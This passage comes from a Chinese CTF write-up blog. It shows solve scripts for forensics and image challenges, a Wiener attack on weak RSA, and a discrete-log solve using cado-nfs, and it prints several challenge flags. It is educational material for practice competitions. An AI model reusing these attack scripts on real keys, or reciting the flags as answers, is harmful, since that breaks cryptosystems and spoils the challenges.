class="hljs-comment"># 读取文件内容</span><br>    content = read_txt_file(input_file)<br>    <br>    <span class="hljs-comment"># 提取手机号码</span><br>    phone_numbers = extract_phone_numbers(content)<br>    <br>    <span class="hljs-comment"># 保存到CSV</span><br>    save_to_csv(phone_numbers, output_file)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;手机号码已成功保存到 <span class="hljs-subst">&#123;output_file&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># 运行主函数</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908236.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="4-1"><a href="#4-1" class="headerlink" title="4-1"></a>4-1</h3><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908276.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>密码MD5取前16位为key值</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908428.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ul>
<li>key值a18551e65c48f51e</li>
<li>追踪流</li>
</ul>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908014.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>e71f50e9773b23f9LrM9NTFlNjVjNzMUQDpsVT1KegABTTk60LjI68X66lH9Fno8gpF7BylFz2ua+exRPZO&#x2F;n8PIOgZrx3NtgYSAYzF2bbOMUDY1Yw&#x3D;&#x3D;792dea3a7ae385ca</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908289.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908715.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">DASCTF&#123;M0Y_W1sh_Y0u_LogF1le_Usg32WEM&#125;<br></code></pre></td></tr></table></figure>

<h3 id="4-2"><a href="#4-2" class="headerlink" title="4-2"></a>4-2</h3><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908752.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>foremost得到png和jpg，png是一个涂改的二维码，用ps把每个颜色不为纯黑（000000）的涂白，即恢复图片</p>
<p>得到第一段flag</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908249.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>jpg尝试之后发现是盲水印，下载工具解即可</p>
<img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908409.png" srcset="/img/loading.gif" lazyload alt="image-20241220185543278" style="zoom:200%;" />

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">014c6e74-0c4a-48fa-8b33-ced16f847e39<br></code></pre></td></tr></table></figure>

<h3 id="4-4"><a href="#4-4" class="headerlink" title="4-4"></a>4-4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">split_and_swap</span>(<span class="hljs-params">image_path, output_path</span>):<br>    <span class="hljs-comment"># 读取图片</span><br>    img = Image.<span class="hljs-built_in">open</span>(image_path)<br>    img = img.convert(<span class="hljs-string">&#x27;RGB&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 获取图片尺寸</span><br>    width, height = img.size<br>    <br>    <span class="hljs-comment"># 确保图片尺寸可以被8整除</span><br>    <span class="hljs-keyword">if</span> width % <span class="hljs-number">8</span> != <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> height % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;图片尺寸必须可以被8整除&quot;</span>)<br>    <br>    <span class="hljs-comment"># 创建一个新的空白图片用于存储结果</span><br>    new_img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height))<br>    new_img_array = np.array(new_img)<br>    <br>    <span class="hljs-comment"># 遍历每一个8x8的格子</span><br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, height, <span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, width, <span class="hljs-number">8</span>):<br>            <span class="hljs-comment"># 提取8x8格子的图像数据</span><br>            block = np.array(img)[y:y+<span class="hljs-number">8</span>, x:x+<span class="hljs-number">8</span>]<br>            <br>            <span class="hljs-comment"># 将8x8格子分为四份</span><br>            h, w, _ = block.shape<br>            half_h, half_w = h // <span class="hljs-number">2</span>, w // <span class="hljs-number">2</span><br>            <br>            <span class="hljs-comment"># 四份分别为：</span><br>            part1 = block[:half_h, :half_w]<br>            part2 = block[:half_h, half_w:]<br>            part3 = block[half_h:, :half_w]<br>            part4 = block[half_h:, half_w:]<br>            <br>            <span class="hljs-comment"># 交换第2份和第3份</span><br>            swapped_block = np.zeros_like(block)<br>            swapped_block[:half_h, :half_w] = part1<br>            swapped_block[:half_h, half_w:] = part3<br>            swapped_block[half_h:, :half_w] = part2<br>            swapped_block[half_h:, half_w:] = part4<br>            <br>            <span class="hljs-comment"># 将交换后的格子放回新图片对应位置</span><br>            new_img_array[y:y+<span class="hljs-number">8</span>, x:x+<span class="hljs-number">8</span>] = swapped_block<br>    <br>    <span class="hljs-comment"># 将数组转换回图片</span><br>    result_img = Image.fromarray(new_img_array)<br>    <br>    <span class="hljs-comment"># 保存新的图片</span><br>    result_img.save(output_path)<br><br><span class="hljs-comment"># 使用示例</span><br>split_and_swap(<span class="hljs-string">&#x27;PixMatrix.jpg&#x27;</span>, <span class="hljs-string">&#x27;output.jpg&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908216.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h3 id="4-5"><a href="#4-5" class="headerlink" title="4-5"></a>4-5</h3><p>下载附件发现是raw文件，明显需要使用volatility</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908709.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>vol.exe -f E:\STUDY\ctf\lzctf\hcb\马赛克的附件2\tempdir\MISC附件\mem\mem.raw imageinfo </p>
<p>发现关键txt 和flag.zip </p>
<p>下载附件发现是raw文件，明显需要使用volatility</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908346.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>vol.exe -f E:\STUDY\ctf\lzctf\hcb\马赛克的附件2\tempdir\MISC附件\mem\mem.raw imageinfo </p>
<p>发现关键txt 和flag.zip </p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908690.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>txt如下</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908490.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>编写脚本恢复zip即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">DASCTF&#123;debef10c-05bb-4ea7-8d01-a5fdf2a246b7&#125;<br></code></pre></td></tr></table></figure>

<h2 id="Crytro"><a href="#Crytro" class="headerlink" title="Crytro"></a>Crytro</h2><h3 id="5-1"><a href="#5-1" class="headerlink" title="5-1"></a>5-1</h3><p>一眼维纳攻击，直接解了</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908477.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">transform</span>(<span class="hljs-params">x,y</span>):       <span class="hljs-comment">#使用辗转相处将分数 x/y 转为连分数的形式</span><br>    res=[]<br>    <span class="hljs-keyword">while</span> y:<br>        res.append(x//y)<br>        x,y=y,x%y<br>    <span class="hljs-keyword">return</span> res<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">continued_fraction</span>(<span class="hljs-params">sub_res</span>):<br>    numerator,denominator=<span class="hljs-number">1</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sub_res[::-<span class="hljs-number">1</span>]:      <span class="hljs-comment">#从sublist的后面往前循环</span><br>        denominator,numerator=numerator,i*numerator+denominator<br>    <span class="hljs-keyword">return</span> denominator,numerator   <span class="hljs-comment">#得到渐进分数的分母和分子，并返回</span><br><br>    <br><span class="hljs-comment">#求解每个渐进分数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_fraction</span>(<span class="hljs-params">x,y</span>):<br>    res=transform(x,y)<br>    res=<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(continued_fraction,(res[<span class="hljs-number">0</span>:i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(res)))))  <span class="hljs-comment">#将连分数的结果逐一截取以求渐进分数</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pq</span>(<span class="hljs-params">a,b,c</span>):      <span class="hljs-comment">#由p+q和pq的值通过维达定理来求解p和q</span><br>    par=gmpy2.isqrt(b*b-<span class="hljs-number">4</span>*a*c)   <span class="hljs-comment">#由上述可得，开根号一定是整数，因为有解</span><br>    x1,x2=(-b+par)//(<span class="hljs-number">2</span>*a),(-b-par)//(<span class="hljs-number">2</span>*a)<br>    <span class="hljs-keyword">return</span> x1,x2<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wienerAttack</span>(<span class="hljs-params">e,n</span>):<br>    <span class="hljs-keyword">for</span> (d,k) <span class="hljs-keyword">in</span> sub_fraction(e,n):  <span class="hljs-comment">#用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span><br>        <span class="hljs-keyword">if</span> k==<span class="hljs-number">0</span>:                     <span class="hljs-comment">#可能会出现连分数的第一个为0的情况，排除</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (e*d-<span class="hljs-number">1</span>)%k!=<span class="hljs-number">0</span>:             <span class="hljs-comment">#ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span><br>            <span class="hljs-keyword">continue</span><br>        <br>        phi=(e*d-<span class="hljs-number">1</span>)//k               <span class="hljs-comment">#这个结果就是 φ(n)</span><br>        px,qy=get_pq(<span class="hljs-number">1</span>,n-phi+<span class="hljs-number">1</span>,n)<br>        <span class="hljs-keyword">if</span> px*qy==n:<br>            p,q=<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(px)),<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(qy))     <span class="hljs-comment">#可能会得到两个负数，负负得正未尝不会出现</span><br>            d=gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))     <span class="hljs-comment">#求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span><br>            <span class="hljs-keyword">return</span> d<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该方法不适用&quot;</span>)<br><br>n = <span class="hljs-number">114566998957451783636756389276471274690612644037126335470456866443567982817002189902938330449132444558501556339080521014838959058380963759366933946623103869574657553262938223064086322963492884606713973124514306815995276393344755433548846003574038937940253826360659447735554684257197194046341849089254659225497</span><br>e = <span class="hljs-number">35489734227210930185586918984451799765619374486784192218215354633053183935617953856556709715097294481614236703293033675674496036691242573294182072757562322996800390363453350727372642264982749305833933966045097125311467413670410802534093354414115267442785896373815076066721029449240889291057288090241124904705</span><br>c = <span class="hljs-number">60503455347700500866544596012233537789678841391057706123172519773588895502922586197178148979273264437566411675346207472455036341903878112074983509557751805365618433536738111588239911292341288514123006967218545943520736254346030465088445419278775539026233686559207400401082452551955780877227801939191694370380</span><br>d=wienerAttack(e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d=&quot;</span>,d)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-comment">#print(m)</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#DASCTF&#123;e694f0b4e9556021d1bc9e8deedba575&#125;</span><br></code></pre></td></tr></table></figure>

<h3 id="5-2"><a href="#5-2" class="headerlink" title="5-2"></a>5-2</h3><p>第二题参考了dexterjie师傅的博客，调一调代码就出了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">pt, G, A, T, S, p</span>):<br>    s = randint(<span class="hljs-number">0</span>,p-<span class="hljs-number">1</span>)<br>    D = G^s<br>    E = A*T*A<br>    F = D*E*D<br>    K = <span class="hljs-built_in">list</span>(D*S*D)<br>    key = <span class="hljs-built_in">sum</span>(K[<span class="hljs-number">0</span>])+<span class="hljs-built_in">sum</span>(K[<span class="hljs-number">1</span>])+<span class="hljs-built_in">sum</span>(K[<span class="hljs-number">2</span>])<br>    mask = <span class="hljs-built_in">int</span>(sha256(<span class="hljs-built_in">str</span>(key).encode()).hexdigest(),<span class="hljs-number">16</span>)<br>    ct = pt ^^ mask<br>    <span class="hljs-keyword">return</span> ct, F<br><br>p =  <span class="hljs-number">72887242108660141996862343556330151015969690949835567252527194788428065480383</span><br>Fp2.&lt;i&gt; = GF(p^<span class="hljs-number">2</span>, modulus=x^<span class="hljs-number">2</span>+<span class="hljs-number">1</span>)<br>M = MatrixSpace(Fp2, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>)<br><br>pk =  ([(<span class="hljs-number">17721183402259872020800275954210023274983052570120081248291897425608931477093</span>*i + <span class="hljs-number">32398110280895896734010284949974832063887503132353681078977206899204202173789</span>, <span class="hljs-number">54531634495057046991515273558305428867102201405617856305008554208336946545276</span>*i + <span class="hljs-number">53559176432820530464958340934397135653021175198597495321065224929188410347695</span>, <span class="hljs-number">27719945502856754481236098196014205483081586087367078493933408080194499938927</span>*i + <span class="hljs-number">1450628736387393873166171805424299538505476789523674611289973478290718453200</span>), (<span class="hljs-number">57242423786686483363839647362581564383925732392730073374546590355998555747077</span>*i + <span class="hljs-number">573726326354574516128249317235875704460857319673337707555095009277545125755</span>, <span class="hljs-number">33631043256657770245013631632455702904903259491780484310654749784948198388976</span>*i + <span class="hljs-number">17344746653834202604930860577508757708688427949046279718508635007113840369042</span>, <span class="hljs-number">37771390186920740637371383242878514021347606565375600086363978842439775164973</span>*i + <span class="hljs-number">60264754185911116825495147907207494752330900415794996812483089251259003404228</span>), (<span class="hljs-number">1163730453993018743008743150834548760986076138562570206571825145859591284352</span>*i + <span class="hljs-number">69245390362211526197537288211735612650619880945856387683074182933575799994162</span>, <span class="hljs-number">11137807706588795799057940108843238078078690609437386007163034291855328303661</span>*i + <span class="hljs-number">50795522649623533714787572047531722836395032085224035511036953078383612475598</span>, <span class="hljs-number">14354786571703727534706086386589187674076604263117377684131521866407943036307</span>*i + <span class="hljs-number">63028649680815097939155846824928638616844025040257105384123424769274942520895</span>)], [(<span class="hljs-number">22137116252880790433838296157765927318220905592359967466680754349755815464341</span>*i + <span class="hljs-number">35503968364379821899511866562472775961434113516937033217642581531414863539290</span>, <span class="hljs-number">38346074307552448152239080224505166810289185210503265380269711384969731945517</span>*i + <span class="hljs-number">9333819647786551924409858116441570177115099865486742684028611902450000042407</span>, <span class="hljs-number">24608192510515673607042276468532809071945836783394960695059783085937608049755</span>*i + <span class="hljs-number">27099766371861599260580052331632986107092105438254563604629919595057370886149</span>), (<span class="hljs-number">57539731529782952718529369617033412770127782205874818027724894673104814770991</span>*i + <span class="hljs-number">12431864123786174601413168140961685219607645783666490625760143190724674574386</span>, <span class="hljs-number">33510082449726132893492104159133966168598115972734064630878005553829725389082</span>*i + <span class="hljs-number">30594711977745700371548334707069524826346332947574826081979927125841475148328</span>, <span class="hljs-number">8911862104171403632946802970568635607253840071000107875759139060453368618583</span>*i + <span class="hljs-number">51594672749496705581452789883241278156858476777167382827032876227546058970732</span>), (<span class="hljs-number">58105830161247358431125768499050987088161417325586965601350797391396603985470</span>*i + <span class="hljs-number">10949064084676782939947256128733523229613253182051362970560478801614590446300</span>, <span class="hljs-number">6665352489343222248969975791152178151760060704226637217535985452272551528693</span>*i + <span class="hljs-number">16163109497937280055564868323730465088174193174761590036929535644203224067166</span>, <span class="hljs-number">26147088265849488467397913386934580340556987670869413865359802108333761377560</span>*i + <span class="hljs-number">14170094609019059182842713618319151553137248441974849089555832123638494739417</span>)], [(<span class="hljs-number">60066006389024369318961505483331049048095679333675437984483948643792214278503</span>*i + <span class="hljs-number">67617085525047580942273623886038114942547589259839196477555874755427651308048</span>, <span class="hljs-number">38692305959834079988532869421062338838072016075793686080934562521314366274998</span>*i + <span class="hljs-number">21104829450473981189549299039898127784065322316764325995863199136802573514</span>, <span class="hljs-number">7207625628360021282792621977024027446511231977201394776410095364976996279450</span>*i + <span class="hljs-number">23039079766688651678553952766794875180844089420934577132338235904018762773928</span>), (<span class="hljs-number">10808368042897084491009063074724200907600038030639153659288985642861405920614</span>*i + <span class="hljs-number">33955795465220353002933680692690511153845418737513482128237117905262919879043</span>, <span class="hljs-number">21645210772494061734726430463955231707074915293749580279327741388687068110310</span>*i + <span class="hljs-number">62225984739450865202997071369617271241348810092608626482294704825641320606694</span>, <span class="hljs-number">14572118842071162051223076904993643512402905544627821044103215186921277812496</span>*i + <span class="hljs-number">63504547636870837320642724540312613748726280369811190421219651308407770510674</span>), (<span class="hljs-number">6529211642735966744323364626486352288002532267939478445216264742350974653419</span>*i + <span class="hljs-number">43426895500365913698127867498420593427453574994051597107529725996420257433857</span>, <span class="hljs-number">66636149494607064863031794353485502915121295051850619450321561966293398587284</span>*i + <span class="hljs-number">51049172134567530748763269555600518661288880531459625871071308764595168859033</span>, <span class="hljs-number">42297258788816007263333796194491196601979606573843177791726417124128570106777</span>*i + <span class="hljs-number">45527674821983322767637713856131638914194577467349514130179266972864796164733</span>)], [(<span class="hljs-number">47645610858583239528541540288030905132801730740336899517917521534427703920375</span>*i + <span class="hljs-number">13272393664089987551368548207128885229248289454405159277755757369580866096516</span>, <span class="hljs-number">60503024931869977830369448001966194434192750710631225090391559259672930497207</span>*i + <span class="hljs-number">22742672333325631628906219543935772962495637869131049729874762344108069789046</span>, <span class="hljs-number">18239371575343144081671835175136676417172797381923442300525086630600561560114</span>*i + <span class="hljs-number">53605095942301227312866863441233162082087535371838738595931070092230378325532</span>), (<span class="hljs-number">49652795839344946948771531270341537200526957150620826334216871981974859849848</span>*i + <span class="hljs-number">72788891932812016325514298655742330969740202920835574638161526839627026310392</span>, <span class="hljs-number">58465406030985457122487065262985150103086610852826560192123766406670919681919</span>*i + <span class="hljs-number">41631921368744416558173670147590406285376603436284660888096365325833457519047</span>, <span class="hljs-number">2867068797023070369258694926242485369317317985428997150826022662547346928319</span>*i + <span class="hljs-number">199536555238705400453079146297641296197748614855192340202929119323998667173</span>), (<span class="hljs-number">19319782936524636558881137449470396788888469756320580071801690941326971557928</span>*i + <span class="hljs-number">34694728896207512382372151140975478616355941017631874070450334268575015485538</span>, <span class="hljs-number">60420266086997924618637147844041161464210208935194926422677077391866663978425</span>*i + <span class="hljs-number">13672363312837218411993834816309940812825734002380106434784905443915361955247</span>, <span class="hljs-number">56317025568717741728727542740124505299029374963112095990350877412868385510001</span>*i + <span class="hljs-number">56960621295573230601502052571104746367180500789238336757504091383665514782189</span>)])<br>F =  [(<span class="hljs-number">36081831373398765496490121898118275331597167308301671911642273861563666664545</span>*i + <span class="hljs-number">20818485079783326431414952124332440995164298376805349071762867760925654560129</span>, <span class="hljs-number">2080527476644284459469754065728582261439110792635520661740429151724797376184</span>*i + <span class="hljs-number">22485923248080983391383279592637691489160934672854638306617785344436031827838</span>, <span class="hljs-number">15544373162545014827602222261755865080947187122261471926061663568794038512828</span>*i + <span class="hljs-number">65994932829738499994169748656063604384011854387402875895186473718226656419067</span>), (<span class="hljs-number">3553534440103543686958858303956716887328727627636404431097647427819509340361</span>*i + <span class="hljs-number">41182149981825439188243414995474733005799065992663037326956422731949977723727</span>, <span class="hljs-number">11444151159046255413538671703716370245288291793592500278345001664024824339590</span>*i + <span class="hljs-number">1802783416049323926195923226865768221398255563865542946492803065162093093803</span>, <span class="hljs-number">15739175840903697568714274177182938758189586472507039731239155962622285528109</span>*i + <span class="hljs-number">38249065906628598713138583591858150126778794837077688369911160900556744463900</span>), (<span class="hljs-number">14364753807737302773559096493138893453118094354943941768609481298414054855231</span>*i + <span class="hljs-number">16290236676179704559365899211744462983770375364688247022596145726641137243214</span>, <span class="hljs-number">3863306473986430132042752882629555431418515741358351198972027547882636615940</span>*i + <span class="hljs-number">1209446834271293681961506708684952401569936830292701272655835127315444154958</span>, <span class="hljs-number">21868026584808712490812183410257662299067350008298604021123682243508255905173</span>*i + <span class="hljs-number">12828201007038003022201361213007595366913298546122923089499182187938898042596</span>)]<br>ct =  <span class="hljs-number">96910798667771988374291172958072220832574586618080134344021393928577220469428</span><br><br>A, T, S, G = [M(ii) <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> pk]<br>F = M(F)<br><br><br><span class="hljs-comment">############################################################### attack</span><br>E = A*T*A<br>detA, detT, detS, detG, detE, detF = A.det(), T.det(), S.det(), G.det(), E.det(), F.det()<br>r = <span class="hljs-number">2244966557637008779362441591080406338119704738381872153797151</span><br><span class="hljs-comment">#R = 80839783875482453208291688688697485912290384775841712705111124172946909733768714734343762988749579725275997021760357500939</span><br><span class="hljs-comment">#r = discrete_log(detG^R, ((detA^(-1)*detT).sqrt())^R, ord=(p^2-1)//R)</span><br><span class="hljs-comment">#s = discrete_log(((detA^(-2)*detT^(-1)*detF).sqrt())^R, detG^R, ord=(p^2-1)//R)</span><br><span class="hljs-comment">#not enough so use cado-nfs</span><br><span class="hljs-keyword">import</span> subprocess<br><br>command = [<br>    <span class="hljs-string">&#x27;./cado-nfs.py&#x27;</span>,<br>    <span class="hljs-string">&#x27;-dlp&#x27;</span>,<br>    <span class="hljs-string">&#x27;-ell&#x27;</span>, <span class="hljs-built_in">str</span>(r),<br>    <span class="hljs-string">&#x27;target=&#x27;</span>+<span class="hljs-built_in">str</span>(t1),<br>    <span class="hljs-built_in">str</span>(p)<br>]<br><span class="hljs-comment">#1541758195020130454925136833461872657607368759409055632195831</span><br><br>command = [<br>    <span class="hljs-string">&#x27;./cado-nfs.py&#x27;</span>,<br>    <span class="hljs-string">&#x27;-dlp&#x27;</span>,<br>    <span class="hljs-string">&#x27;-ell&#x27;</span>, <span class="hljs-built_in">str</span>(r),<br>    <span class="hljs-string">&#x27;target=&#x27;</span>+<span class="hljs-built_in">str</span>(t2),<br>    <span class="hljs-built_in">str</span>(p)<br>]<br><span class="hljs-comment">#780392429787953543532147509264510635118839088869098098140941</span><br><br><span class="hljs-keyword">try</span>:<br>    result = subprocess.run(command, check=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>, capture_output=<span class="hljs-literal">True</span>)<br>    <span class="hljs-built_in">print</span>(result.stdout)<br><span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ERROR: <span class="hljs-subst">&#123;e.returncode&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ERROR:&quot;</span>, e.stderr)<br><span class="hljs-comment">#t2^s = t1</span><br>Fr = GF(r)<br>s1 = Fr(<span class="hljs-number">1541758195020130454925136833461872657607368759409055632195831</span>)<br>s2 = Fr(<span class="hljs-number">780392429787953543532147509264510635118839088869098098140941</span>)<br>ss = discrete_log(<span class="hljs-built_in">pow</span>(t1, <span class="hljs-number">6</span>*r, p), <span class="hljs-built_in">pow</span>(t2, <span class="hljs-number">6</span>*r, p), operation=<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-built_in">ord</span>=(p-<span class="hljs-number">1</span>)//r)<br>s = crt([<span class="hljs-built_in">int</span>(ss), <span class="hljs-built_in">int</span>(s1/s2)], [(p-<span class="hljs-number">1</span>)//(<span class="hljs-number">6</span>*r), r])<br><br>ss = s<br><span class="hljs-keyword">for</span> ii <span 